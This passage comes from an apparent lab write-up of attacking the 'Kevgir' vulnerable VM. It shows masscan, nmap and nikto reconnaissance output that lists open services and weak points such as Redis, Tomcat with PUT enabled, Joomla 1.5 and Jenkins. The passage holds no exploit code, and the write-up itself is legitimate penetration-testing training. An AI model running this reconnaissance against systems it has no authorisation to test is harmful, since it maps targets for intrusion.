<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.128/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-05-23 10:10:36 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 8081/tcp on 10.1.1.128                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.128                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 25/tcp on 10.1.1.128                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 8080/tcp on 10.1.1.128                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 445/tcp on 10.1.1.128                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 6379/tcp on 10.1.1.128                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.128                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 44966/tcp on 10.1.1.128                                 &lt;br/&gt;
</span><span class='line'>Discovered open port 9000/tcp on 10.1.1.128                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 37543/tcp on 10.1.1.128                                 &lt;br/&gt;
</span><span class='line'>Discovered open port 59876/tcp on 10.1.1.128                                 &lt;br/&gt;
</span><span class='line'>Discovered open port 139/tcp on 10.1.1.128                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 35812/tcp on 10.1.1.128                                 &lt;br/&gt;
</span><span class='line'>Discovered open port 1322/tcp on 10.1.1.128                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 41295/tcp on 10.1.1.128                                 &lt;br/&gt;
</span><span class='line'>Discovered open port 2049/tcp on 10.1.1.128                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 34551/tcp on 10.1.1.128                                 &lt;br/&gt;
</span><span class='line'>Discovered open port 59788/tcp on 10.1.1.128
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap 6.49BETA5 scan initiated Mon May <span class="m">23</span> 06:20:21 <span class="m">2016</span> as: nmap -sV -A -O -v -p 25-9000,34551-44966,59788,59876 -oN 128_nmap.txt 10.1.1.128&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.128
</span><span class='line'>Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">19376</span> closed ports
</span><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>25/tcp    open  ftp         vsftpd 3.0.2
</span><span class='line'><span class="p">|</span>&lt;em&gt;smtp-commands: SMTP: EHLO <span class="m">530</span> Please login with USER and PASS.
</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Kevgir VM
</span><span class='line'>111/tcp   open  rpcbind     2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X <span class="o">(</span>workgroup: CANYOUPWNME<span class="o">)</span>
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 3.X <span class="o">(</span>workgroup: CANYOUPWNME<span class="o">)</span>
</span><span class='line'>1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">256</span> 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>2049/tcp  open  nfs         2-4 <span class="o">(</span>RPC <span class="c">#100003)</span>
</span><span class='line'>6379/tcp  open  redis       Redis key-value store
</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'><span class="p">|</span> http-methods: GET HEAD POST PUT DELETE OPTIONS
</span><span class='line'><span class="p">|</span> Potentially risky methods: PUT DELETE
</span><span class='line'><span class="p">|</span>&lt;em&gt;See &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://nmap.org/nsedoc/scripts/http-methods.html&quot;</span>&gt;http://nmap.org/nsedoc/scripts/http-methods.html&lt;/a&gt;
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-open-proxy: Proxy might be redirecting requests
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache-Coyote/1.1
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Apache Tomcat
</span><span class='line'>8081/tcp  open  http        Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-generator: Joomla! 1.5 - Open Source Content Management
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 200<span class="o">)</span>
</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">14</span> disallowed entries
</span><span class='line'><span class="p">|</span> /administrator/ /cache/ /components/ /images/
</span><span class='line'><span class="p">|</span> /includes/ /installation/ /language/ /libraries/ /media/
</span><span class='line'><span class="p">|</span>&lt;em&gt;/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: Welcome to the Frontpage
</span><span class='line'>9000/tcp  open  http        Jetty winstone-2.9
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 200<span class="o">)</span>
</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry
</span><span class='line'><span class="p">|</span>&lt;/em&gt;/
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Jetty<span class="o">(</span>winstone-2.9<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Dashboard <span class="o">[</span>Jenkins<span class="o">]</span>
</span><span class='line'>34551/tcp open  ssh         Apache Mina sshd 0.8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'>35812/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
</span><span class='line'>37543/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
</span><span class='line'>41295/tcp open  unknown
</span><span class='line'>44966/tcp open  status      <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
</span><span class='line'>59788/tcp open  nlockmgr    1-4 <span class="o">(</span>RPC <span class="c">#100021)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/tcp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100003</span>  2,3,4       2049/udp  nfs
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      56442/udp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100005</span>  1,2,3      59876/tcp  mountd
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      52779/udp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100021</span>  1,3,4      59788/tcp  nlockmgr
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35287/udp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          44966/tcp  status
</span><span class='line'><span class="p">|</span>   <span class="m">100227</span>  2,3         2049/tcp  nfs_acl
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">100227</span>  2,3         2049/udp  nfs_acl
</span><span class='line'>59876/tcp open  mountd      1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
</span><span class='line'><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org/cgi-bin/submit.cgi?new-service&quot;</span>&gt;https://nmap.org/cgi-bin/submit.cgi?new-service&lt;/a&gt; :
</span><span class='line'>SF-Port41295-TCP:V<span class="o">=</span>6.49BETA5%I<span class="o">=</span>7%D<span class="o">=</span>5/23%Time<span class="o">=</span>5742D989%P<span class="o">=</span>x86_64-pc-linux-gn
</span><span class='line'>SF:u%r<span class="o">(</span>DNSVersionBindReq,36,<span class="p">&amp;</span>ldquo<span class="p">;</span>Unrecognized<span class="se">\x</span>20protocol:<span class="se">\x</span>20<span class="se">\0\x</span>06<span class="se">\x</span>01<span class="se">\0\0\x</span>
</span><span class='line'>SF:01<span class="se">\0\0\0\0\0\0\x</span>07version<span class="se">\x</span>04bind<span class="se">\0\0\x</span>10<span class="se">\0\x</span>03<span class="se">\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequest,
</span><span class='line'>SF:24,<span class="p">&amp;</span>ldquo<span class="p">;</span>Unrecognized<span class="se">\x</span>20protocol:<span class="se">\x</span>20<span class="se">\0\0\x</span>10<span class="se">\0\0\0\0\0\0\0\0\0\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>MAC Address: 00:0C:29:C1:44:AE <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.015 days <span class="o">(</span>since Mon May <span class="m">23</span> 06:01:00 2016<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">247</span> <span class="o">(</span>Good luck!<span class="o">)</span>
</span><span class='line'>IP ID Sequence Generation: All zeros
</span><span class='line'>Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Host script results:
</span><span class='line'><span class="p">|</span> nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
</span><span class='line'><span class="p">|</span> Names:
</span><span class='line'><span class="p">|</span>   CANYOUPWNME&lt;00&gt;      Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'><span class="p">|</span>   CANYOUPWNME&lt;03&gt;      Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'><span class="p">|</span>   CANYOUPWNME&lt;20&gt;      Flags: &lt;unique&gt;&lt;active&gt;
</span><span class='line'><span class="p">|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span><span class='line'><span class="p">|</span>&lt;em&gt;  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span><span class='line'><span class="p">|</span> smb-os-discovery:
</span><span class='line'><span class="p">|</span>   OS: Unix <span class="o">(</span>Samba 4.1.6-Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   Computer name: canyoupwnme
</span><span class='line'><span class="p">|</span>   NetBIOS computer name: CANYOUPWNME
</span><span class='line'><span class="p">|</span>   Domain name:
</span><span class='line'><span class="p">|</span>   FQDN: canyoupwnme
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  System <span class="nb">time</span>: 2016-05-23T13:22:22+03:00
</span><span class='line'><span class="p">|</span> smb-security-mode:
</span><span class='line'><span class="p">|</span>   account_used: guest
</span><span class='line'><span class="p">|</span>   authentication_level: user
</span><span class='line'><span class="p">|</span>   challenge_response: supported
</span><span class='line'><span class="p">|</span>&lt;em&gt;  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;smbv2-enabled: Server supports SMBv2 protocol&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'><span class="m">1</span>   0.34 ms 10.1.1.128&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Read data files from: /usr/bin/../share/nmap
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org/submit/&quot;</span>&gt;https://nmap.org/submit/&lt;/a&gt; .&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap <span class="k">done</span> at Mon May <span class="m">23</span> 06:22:54 <span class="m">2016</span> <span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 153.46 seconds&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>There are some suspectable information:</p>

<ul>
<li>FTP service is running on port 25</li>
<li>SSH service is running on port 1322</li>
<li>Web service is running on port 80</li>
<li>Redis services is running on port 6379</li>
<li>Tomcat is running on port 8080</li>
<li>Joomla v1.5 is running on port 8081</li>
<li>Jenkins is running on port 9000</li>
</ul>


<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port 80, 8080, 9091 and 9000 found by port-scanning stage.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;- Nikto v2.1.6&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Target IP:          10.1.1.128&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Target Hostname:    10.1.1.128&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Start Time:         2016-05-23 06:28:48 <span class="o">(</span>GMT-4<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Server: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Server leaks inodes via ETags, header found with file /, fields: 0xec 0x52c8b6c4fbb0a&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The anti-clickjacking X-Frame-Options header is not present.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Apache/2.4.7 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.12<span class="o">)</span>. Apache 2.0.65 <span class="o">(</span>final release<span class="o">)</span> and 2.2.29 are also current.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Allowed HTTP Methods: GET, HEAD, POST, OPTIONS&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.14&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>x-ob_mode<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: 0&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-3233: /icons/README: Apache default file found.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/phpmyadmin/: phpMyAdmin directory found&lt;/li&gt;
